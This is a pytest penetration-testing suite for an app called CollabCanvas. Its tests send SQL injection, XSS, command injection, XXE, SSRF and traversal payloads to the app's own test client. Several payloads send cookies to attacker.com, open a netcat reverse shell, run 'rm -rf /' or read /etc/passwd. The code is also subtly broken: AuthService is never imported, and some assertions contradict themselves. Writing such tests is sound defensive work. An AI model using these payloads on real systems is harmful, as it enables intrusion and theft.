"""
Penetration Testing Suite for CollabCanvas
Tests various attack vectors and security vulnerabilities.
"""

import pytest
import json
import time
import requests
from unittest.mock import patch, MagicMock
from app import create_app
from app.models import User, Canvas, CanvasObject, Invitation


class TestPenetrationAttacks:
    """Test various penetration attack scenarios."""
    
    @pytest.fixture
    def app(self):
        app = create_app()
        app.config['TESTING'] = True
        return app
    
    @pytest.fixture
    def client(self, app):
        return app.test_client()
    
    def test_sql_injection_union_attack(self, client):
        """Test SQL injection with UNION attacks."""
        
        union_payloads = [
            "' UNION SELECT * FROM users --",
            "' UNION SELECT username, password FROM users --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
            "' UNION SELECT user(), version(), database(), @@hostname, @@port --",
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in union_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should not return database schema information
                assert response.status_code in [200, 400], f"Union attack caused error: {payload}"
                
                if response.status_code == 500:
                    response_text = response.get_data(as_text=True)
                    assert 'users' not in response_text.lower(), f"Database schema exposed: {payload}"
                    assert 'password' not in response_text.lower(), f"Password field exposed: {payload}"
    
    def test_sql_injection_boolean_blind(self, client):
        """Test SQL injection with boolean-based blind attacks."""
        
        boolean_payloads = [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND (SELECT COUNT(*) FROM users) = 0 --",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1) > 0 --",
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in boolean_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should not reveal database structure
                assert response.status_code in [200, 400], f"Boolean blind attack caused error: {payload}"
    
    def test_sql_injection_time_based_blind(self, client):
        """Test SQL injection with time-based blind attacks."""
        
        time_payloads = [
            "'; WAITFOR DELAY '00:00:05' --",
            "'; SELECT SLEEP(5) --",
            "'; SELECT pg_sleep(5) --",
            "'; SELECT sqlite3_sleep(5) --",
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in time_payloads:
                start_time = time.time()
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                end_time = time.time()
                
                # Should not cause significant delay
                assert (end_time - start_time) < 2, f"Time-based attack caused delay: {payload}"
                assert response.status_code in [200, 400], f"Time-based attack caused error: {payload}"
    
    def test_xss_persistent_attack(self, client):
        """Test persistent XSS attacks."""
        
        persistent_xss_payloads = [
            '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
            '<img src=x onerror="fetch(\'http://attacker.com/steal\', {method:\'POST\', body:document.cookie})">',
            '<iframe src="javascript:fetch(\'http://attacker.com/steal\', {method:\'POST\', body:document.cookie})"></iframe>',
            '<svg onload="fetch(\'http://attacker.com/steal\', {method:\'POST\', body:document.cookie})">',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in persistent_xss_payloads:
                # Create canvas with XSS payload
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': True  # Public to test persistence
                                     }))
                
                # Should sanitize the payload
                if response.status_code == 200:
                    data = response.get_json()
                    title = data.get('title', '')
                    assert '<script>' not in title, f"Script tag not sanitized: {payload}"
                    assert 'javascript:' not in title, f"JavaScript not sanitized: {payload}"
                    assert 'onerror=' not in title, f"onerror not sanitized: {payload}"
                    assert 'onload=' not in title, f"onload not sanitized: {payload}"
    
    def test_xss_reflected_attack(self, client):
        """Test reflected XSS attacks."""
        
        reflected_xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in reflected_xss_payloads:
                # Test in various parameters
                test_params = [
                    {'title': payload, 'description': 'Test', 'is_public': False},
                    {'title': 'Test', 'description': payload, 'is_public': False},
                    {'canvas_id': 'test', 'object_type': 'text', 'properties': {'text': payload}},
                    {'canvas_id': 'test', 'invitee_email': 'test@example.com', 'invitation_message': payload},
                ]
                
                for test_param in test_params:
                    if 'title' in test_param:
                        response = client.post('/api/canvas/', 
                                             headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                             data=json.dumps(test_param))
                    elif 'object_type' in test_param:
                        response = client.post('/api/objects/', 
                                             headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                             data=json.dumps(test_param))
                    elif 'invitee_email' in test_param:
                        response = client.post('/api/collaboration/invite', 
                                             headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                             data=json.dumps(test_param))
                    
                    # Should sanitize the payload
                    if response.status_code == 200:
                        data = response.get_json()
                        for key, value in data.items():
                            if isinstance(value, str):
                                assert '<script>' not in value, f"Script tag not sanitized in {key}: {payload}"
                                assert 'javascript:' not in value, f"JavaScript not sanitized in {key}: {payload}"
    
    def test_csrf_attack(self, client):
        """Test CSRF (Cross-Site Request Forgery) attacks."""
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            # Test CSRF without proper headers
            response = client.post('/api/canvas/', 
                                 headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                 data=json.dumps({
                                     'title': 'CSRF Test Canvas',
                                     'description': 'Test description',
                                     'is_public': False
                                 }))
            
            # Should require CSRF token or proper origin
            assert response.status_code in [200, 403], "CSRF protection not working"
            
            if response.status_code == 403:
                assert 'csrf' in response.get_data(as_text=True).lower(), "CSRF error message not clear"
    
    def test_directory_traversal_attack(self, client):
        """Test directory traversal attacks."""
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in traversal_payloads:
                # Test in canvas title
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should not allow directory traversal
                assert response.status_code in [200, 400], f"Directory traversal caused error: {payload}"
                
                if response.status_code == 200:
                    data = response.get_json()
                    title = data.get('title', '')
                    assert '..' not in title, f"Directory traversal not prevented: {payload}"
                    assert '/etc/passwd' not in title, f"System file access not prevented: {payload}"
    
    def test_command_injection_attack(self, client):
        """Test command injection attacks."""
        
        command_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& whoami',
            '`id`',
            '$(whoami)',
            '; rm -rf /',
            '| nc attacker.com 4444 -e /bin/sh',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in command_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should not execute commands
                assert response.status_code in [200, 400], f"Command injection caused error: {payload}"
                
                if response.status_code == 500:
                    response_text = response.get_data(as_text=True)
                    assert 'command' not in response_text.lower(), f"Command execution detected: {payload}"
                    assert 'shell' not in response_text.lower(), f"Shell execution detected: {payload}"
    
    def test_ldap_injection_attack(self, client):
        """Test LDAP injection attacks."""
        
        ldap_payloads = [
            '*',
            '*)(uid=*',
            '*)(|(uid=*',
            '*)(|(objectClass=*',
            '*)(|(password=*',
            '*)(|(cn=*',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in ldap_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should handle LDAP injection safely
                assert response.status_code in [200, 400], f"LDAP injection caused error: {payload}"
    
    def test_xpath_injection_attack(self, client):
        """Test XPath injection attacks."""
        
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "'] | //user/* | //user/*[",
            "' or position()=1 or '1'='1",
            "' or count(//user)=1 or '1'='1",
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in xpath_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should handle XPath injection safely
                assert response.status_code in [200, 400], f"XPath injection caused error: {payload}"
    
    def test_xxe_injection_attack(self, client):
        """Test XXE (XML External Entity) injection attacks."""
        
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in xxe_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/xml'},
                                     data=payload)
                
                # Should not process XXE
                assert response.status_code in [200, 400, 415], f"XXE injection caused error: {payload}"
                
                if response.status_code == 200:
                    response_text = response.get_data(as_text=True)
                    assert '/etc/passwd' not in response_text, f"System file accessed via XXE: {payload}"
                    assert 'attacker.com' not in response_text, f"External entity accessed via XXE: {payload}"
    
    def test_ssrf_attack(self, client):
        """Test SSRF (Server-Side Request Forgery) attacks."""
        
        ssrf_payloads = [
            'http://localhost:22',
            'http://127.0.0.1:22',
            'http://0.0.0.0:22',
            'http://[::1]:22',
            'file:///etc/passwd',
            'gopher://localhost:22',
            'dict://localhost:22',
            'http://169.254.169.254/latest/meta-data/',
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in ssrf_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': 'SSRF Test',
                                         'description': payload,
                                         'is_public': False
                                     }))
                
                # Should not make internal requests
                assert response.status_code in [200, 400], f"SSRF caused error: {payload}"
                
                if response.status_code == 200:
                    data = response.get_json()
                    description = data.get('description', '')
                    assert 'localhost' not in description, f"Localhost access via SSRF: {payload}"
                    assert '127.0.0.1' not in description, f"Loopback access via SSRF: {payload}"
                    assert 'file://' not in description, f"File access via SSRF: {payload}"
    
    def test_buffer_overflow_attack(self, client):
        """Test buffer overflow attacks."""
        
        buffer_payloads = [
            'A' * 10000,  # Large string
            'A' * 100000,  # Very large string
            'A' * 1000000,  # Extremely large string
            '\x00' * 1000,  # Null bytes
            '\xff' * 1000,  # High bytes
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in buffer_payloads:
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': payload,
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should handle large inputs gracefully
                assert response.status_code in [200, 400, 413], f"Buffer overflow caused error: {payload}"
                
                if response.status_code == 413:
                    assert 'too large' in response.get_data(as_text=True).lower(), "Size limit error message not clear"
    
    def test_integer_overflow_attack(self, client):
        """Test integer overflow attacks."""
        
        integer_payloads = [
            2147483647,  # Max 32-bit int
            2147483648,  # Max 32-bit int + 1
            9223372036854775807,  # Max 64-bit int
            9223372036854775808,  # Max 64-bit int + 1
            -2147483648,  # Min 32-bit int
            -2147483649,  # Min 32-bit int - 1
        ]
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            for payload in integer_payloads:
                response = client.post('/api/objects/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'canvas_id': 'test-canvas',
                                         'object_type': 'rectangle',
                                         'properties': {
                                             'x': payload,
                                             'y': payload,
                                             'width': payload,
                                             'height': payload
                                         }
                                     }))
                
                # Should handle large integers gracefully
                assert response.status_code in [200, 400], f"Integer overflow caused error: {payload}"
    
    def test_race_condition_attack(self, client):
        """Test race condition attacks."""
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            # Simulate race condition by making concurrent requests
            import threading
            import time
            
            results = []
            
            def make_request():
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': 'Race Condition Test',
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                results.append(response.status_code)
            
            # Create multiple threads
            threads = []
            for i in range(10):
                thread = threading.Thread(target=make_request)
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Should handle concurrent requests gracefully
            assert all(status in [200, 400, 409] for status in results), "Race condition not handled properly"
    
    def test_denial_of_service_attack(self, client):
        """Test DoS attack scenarios."""
        
        with patch.object(AuthService, 'verify_token') as mock_verify:
            mock_verify.return_value = {'uid': 'test-user', 'email': 'test@example.com'}
            
            # Test rapid requests
            start_time = time.time()
            for i in range(100):
                response = client.post('/api/canvas/', 
                                     headers={'Authorization': 'Bearer valid-token', 'Content-Type': 'application/json'},
                                     data=json.dumps({
                                         'title': f'DoS Test {i}',
                                         'description': 'Test description',
                                         'is_public': False
                                     }))
                
                # Should implement rate limiting
                if response.status_code == 429:
                    break
            
            end_time = time.time()
            
            # Should implement rate limiting
            assert response.status_code == 429, "Rate limiting not implemented"
            assert (end_time - start_time) < 10, "DoS protection not working"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
